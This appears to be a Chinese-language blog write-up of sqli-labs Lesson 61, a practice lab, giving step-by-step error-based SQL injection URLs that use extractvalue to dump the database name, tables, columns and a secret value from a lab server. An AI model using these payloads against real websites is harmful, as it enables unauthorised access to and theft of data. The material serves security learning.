---
title: sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求
date: 2018-11-29 11:46:49
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求

------

## 手注

对常见的`'))`进行测试

`http://10.60.17.35:8082/Less-61/?id=1'`

发现报错

![001](/img/sql/Lesson-61/001.png)

最终测试出闭合`'))`

`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,database(),0x7e))%23`

![002](/img/sql/Lesson-61/002.png)

`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),0x7e))%23`

![003](/img/sql/Lesson-61/003.png)

`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='l38s5fjaki'),0x7e))%23`

![004](/img/sql/Lesson-61/004.png)

`http://10.60.17.35:8082/Less-61/?id=1'))+and+extractvalue(null,concat(0x7e,(select+GROUP_CONCAT(secret_Y1R9)from challenges.l38s5fjaki),0x7e))%23`

![005](/img/sql/Lesson-61/005.png)

提交

![006](/img/sql/Lesson-61/006.png)

